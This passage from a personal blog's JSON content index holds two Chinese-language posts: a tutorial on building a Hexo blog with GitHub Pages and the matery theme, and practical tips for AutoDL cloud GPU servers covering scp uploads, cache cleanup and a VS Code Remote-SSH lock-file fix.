&#125;","categories":[{"name":"笔记","slug":"笔记","permalink":"https://saintcen.github.io/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CS基础","slug":"CS基础","permalink":"https://saintcen.github.io/tags/CS%E5%9F%BA%E7%A1%80/"}]},{"title":"Hexo-Blog搭建教程","slug":"Hexo-Blog搭建教程","date":"2025-09-24T16:00:00.000Z","updated":"2025-10-03T08:05:29.325Z","comments":true,"path":"2025/09/25/Hexo-Blog搭建教程/","permalink":"https://saintcen.github.io/2025/09/25/Hexo-Blog%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/","excerpt":"","text":"在思考如何搭建个人博客时，我决定采用了Hexo+Github Pages的方案。 纯静态资源网站，只需修改前端代码和资源文件 Github托管，免费且易于维护 Hexo提供了优秀的博客模板和便捷的命令行 参考资料 官方文档：配置 | Hexo 大佬的博客1：Hexo+Github搭建个人Wiki风格博客 | Blogs 大佬的博客2：[三万字教程]基于Hexo的matery主题搭建博客并深度优化一站式完全教程 - 游颜色 环境搭建 基本工具 搭建过程中，需要利用npm下载相关包，用git上传到指定仓库。 Node.js git 具体如何安装使用请自行搜索。 项目部署 1.在Github上创建一个仓库并取名为 用户名.github.io 2.准备一个空文件夹，在文件夹里打开终端，使用npm一键安装 Hexo博客程序 npm install -g hexo-cli 3.进行Hexo初始化 hexo init 4.使用npm安装package.json里面的依赖 npm install 5.安装用于部署的包hexo-deployer-git npm install hexo-deployer-git --save 6.修改_config.yml文件末尾的Deployment部分（善用查找！） 这里建议大家用SSH配置，可以避免网络等问题。 Hexo使用SSH连接GitHub_hexo的ssh连接github-CSDN博客 deploy: type: git repo: git@github.com:你的用户名&#x2F;你的仓库名.git branch: main 主题安装 我选择的是matery，大家也可以去搜索自己喜欢的主题。 GitHub - blinkfox/hexo-theme-matery 具体安装视官方文档而定，大部分可以这么安装。 cd &lt;Your Location&gt; git clone https:&#x2F;&#x2F;github.com&#x2F;blinkfox&#x2F;hexo-theme-matery.git 随后，请修改主文件夹下的_config.yml的theme。 有两个_config.yml？ 公式-Mathjax 1.卸载部分插件 npm un hexo-math npm un hexo-renderer-marked 2.安装hexo-renderer-pandoc渲染器 npm i hexo-renderer-pandoc 3.配置主题配置下的mathjax设置(文件位置在\\themes\\{主题名}\\ _config.yml # MathJax mathjax: enable: true per_page: true 4.安装Pandoc 去Pandoc官网下载最新版本：Pandoc - About pandoc 安装完将_post里的md文件写入公式测试即可。 图片 修改_config.yml如下： post_asset_folder: true marked: prependRoot: true postAsset: true 在文件夹下打开终端，使用hexo new [layout] &lt;title&gt;命令创建一篇新文章（也可以手动创建），此时会在source/_post目录下创建一个同名的文件夹和md文件。接着可以把所有该文章有关的资源文件都放在同名的目录中，在md文件中使用引入格式![image1](image1.png)即可引入图片（如果是网络资源引用网址即可）。 四大命令 hexo clean # 清除生成的网页文件 hexo g # 生成静态网页 hexo s # 本地运行博客 hexo d # 将网页文件推送至远程服务器 问题记录 所有问题的排查，请善用F12控制台的报错信息 渲染报错 Uncaught TypeError: $(...).lightGallery is not a function Uncaught：$(.).lightGallery不是函数-腾讯云开发者社区-腾讯云 把所有本地硬编码替换成cdn，包括_config.yml里的lib和main-style.ejs/layout.ejs的引用。 lightgallery:https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;lightgallery&#x2F;1.10.0&#x2F;css&#x2F;lightgallery.css &lt;script src&#x3D;&quot;&lt;%- theme.libs.js.lightgallery %&gt;&quot;&gt;&lt;&#x2F;script&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;&lt;%- theme.libs.css.lightgallery %&gt;&quot;&gt;","categories":[{"name":"教程","slug":"教程","permalink":"https://saintcen.github.io/categories/%E6%95%99%E7%A8%8B/"}],"tags":[{"name":"开发","slug":"开发","permalink":"https://saintcen.github.io/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"AutoDL小trick（更新中）","slug":"AutoDL小trick（更新中）","date":"2025-09-24T16:00:00.000Z","updated":"2025-10-15T16:45:01.090Z","comments":true,"path":"2025/09/25/AutoDL小trick（更新中）/","permalink":"https://saintcen.github.io/2025/09/25/AutoDL%E5%B0%8Ftrick%EF%BC%88%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/","excerpt":"","text":"scp 手动拉拽不支持文件夹，Linux和Powershell均支持scp命令。 scp -r -P 21075 /media/dzc/Data/GeoPixel-7B root@connect.westc.gpuhub.com:/root/autodl-tmp/ -r表示文件夹，-P 表示端口，/media/dzc/Data/GeoPixel-7B是待上传文件 ，root@connect.westc.gpuhub.com是远程SSH主机，/root/autodl-tmp/GeoPixel是远程主机的文件夹，随后根据提示输入密码，等待上传即可。 缓存清理 参考AutoDL帮助文档 以下两个是可以直接删除，不影响系统运行的目录。 du -sh /root/miniconda3/pkgs/ &amp;&amp; rm -rf /root/miniconda3/pkgs/* # conda的历史包 du -sh /root/.local/share/Trash &amp;&amp; rm -rf /root/.local/share/Trash # jupyterlab的回收站 以下两个是可能占用较大空间，但需要根据实际情况清理的目录。 du -sh /tmp/ #查看/tmp占用的空间大小 du -sh /root/.cache #查看/root/.cache占用的空间大小 连接不上服务器 参考【经验】VScode 远程 SSH 连接 Ubuntu 或 TrueNas 出错，Could not establish connection 本人的遇到的报错这里没有提到。 Setting up SSH Host connect.westb.seetacloud.com: Waiting for other windows to connect LocalLockTimeout │ Error: LocalLockTimeout (Timed out while waiting for the local startup lock) 检查一下output [20:49:01.519] Log Level: 2 [20:49:01.533] SSH Resolver called for &quot;ssh-remote+connect.westb.seetacloud.com&quot;, attempt 1 [20:49:01.537] remote.SSH.useLocalServer &#x3D; true [20:49:01.537] remote.SSH.useExecServer &#x3D; true [20:49:01.537] remote.SSH.bindHost &#x3D; &#123;&#125; [20:49:01.537] remote.SSH.path &#x3D; [20:49:01.537] remote.SSH.configFile &#x3D; [20:49:01.537] remote.SSH.useFlock &#x3D; true [20:49:01.537] remote.SSH.lockfilesInTmp &#x3D; false [20:49:01.537] remote.SSH.localServerDownload &#x3D; auto [20:49:01.537] remote.SSH.remoteServerListenOnSocket &#x3D; false [20:49:01.537] remote.SSH.defaultExtensions &#x3D; [] [20:49:01.537] remote.SSH.defaultExtensionsIfInstalledLocally &#x3D; [] [20:49:01.537] remote.SSH.loglevel &#x3D; 2 [20:49:01.538] remote.SSH.enableDynamicForwarding &#x3D; true [20:49:01.538] remote.SSH.enableRemoteCommand &#x3D; false [20:49:01.538] remote.SSH.serverPickPortsFromRange &#x3D; &#123;&#125; [20:49:01.538] remote.SSH.serverInstallPath &#x3D; &#123;&#125; [20:49:01.538] remote.SSH.permitPtyAllocation &#x3D; false [20:49:01.538] remote.SSH.preferredLocalPortRange &#x3D; undefined [20:49:01.538] remote.SSH.useCurlAndWgetConfigurationFiles &#x3D; false [20:49:01.538] remote.SSH.experimental.chat &#x3D; true [20:49:01.538] remote.SSH.experimental.enhancedSessionLogs &#x3D; true [20:49:01.538] remote.SSH.httpProxy &#x3D; &#123;&quot;*&quot;:&quot;&quot;&#125; [20:49:01.538] remote.SSH.httpsProxy &#x3D; &#123;&quot;*&quot;:&quot;&quot;&#125; [20:49:01.544] VS Code version: 1.104.1 [20:49:01.544] Remote-SSH version: remote-ssh@0.120.0 [20:49:01.544] linux x64 [20:49:01.547] SSH Resolver called for host: connect.westb.seetacloud.com [20:49:01.547] Setting up SSH remote &quot;connect.westb.seetacloud.com&quot; [20:49:01.551] Acquiring local install lock: &#x2F;media&#x2F;dzc&#x2F;Data&#x2F;tmp&#x2F;vscode-remote-ssh-43daf7d8-install.lock [20:49:03.052] Starting to look for password prompt from another window [20:51:01.698] Resolver error: Error: Timed out while waiting for the local startup lock at y.Create (&#x2F;home&#x2F;dzc&#x2F;.vscode&#x2F;extensions&#x2F;ms-vscode-remote.remote-ssh-0.120.0&#x2F;out&#x2F;extension.js:2:744751) at &#x2F;home&#x2F;dzc&#x2F;.vscode&#x2F;extensions&#x2F;ms-vscode-remote.remote-ssh-0.120.0&#x2F;out&#x2F;extension.js:2:793216 at r (&#x2F;home&#x2F;dzc&#x2F;.vscode&#x2F;extensions&#x2F;ms-vscode-remote.remote-ssh-0.120.0&#x2F;out&#x2F;extension.js:2:507932) at &#x2F;home&#x2F;dzc&#x2F;.vscode&#x2F;extensions&#x2F;ms-vscode-remote.remote-ssh-0.120.0&#x2F;out&#x2F;extension.js:2:508185 at FSReqCallback.oncomplete (node:fs:188:23) [20:51:01.707] ---------- [Session Summary] ----------- [20:51:01.707] [LocalLockTimeout]: Error: LocalLockTimeout (Timed out while waiting for the local startup lock) 删除锁文件，重启Vscode连接即可。 sudo rm -f /media/dzc/Data/tmp/vscode-remote-ssh-43daf7d8-install.lock 先下载模型文件再下载 想直接在云服务器用VPN下载可以参考这个仓库clash-for-AutoDL 但我个人建议，还是先在本地用VPN下载后再用scp上传，注意，有些代码会自动从网站下载文件，你需要修改代码让它从本地读取。 安装依赖项 pip和conda使用镜像源能加速下载依赖包，但部分镜像源高峰期比较拥挤。切换源方法： 直接点击确定即可，无需重启实例。另外也可以通过命令行修改配置文件(.condarc)，不详细展开。","categories":[{"name":"科研","slug":"科研","permalink":"https://saintcen.github.io/categories/%E7%A7%91%E7%A0%94/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://saintcen.github.io/tags/AI/"}]}],"categories":[{"name":"教程","slug":"教程","permalink":"https://saintcen.github.io/categories/%E6%95%99%E7%A8%8B/"},{"name":"笔记","slug":"笔记","permalink":"https://saintcen.github.io/categories/%E7%AC%94%E8%AE%B0/"},{"name":"科研","slug":"科研","permalink":"https://saintcen.github.io/categories/%E7%A7%91%E7%A0%94/"}],"tags":[{"name":"CS基础","slug":"CS基础","permalink":"https://saintcen.github.io/tags/CS%E5%9F%BA%E7%A1%80/"},{"name":"CTF","slug":"CTF","permalink":"https://saintcen.github.io/tags/CTF/"},{"name":"开发","slug":"开发","permalink":"https://saintcen.github.io/tags/%E5%BC%80%E5%8F%91/"},{"name":"AI","slug":"AI","permalink":"https://saintcen.github.io/tags/AI/"}]}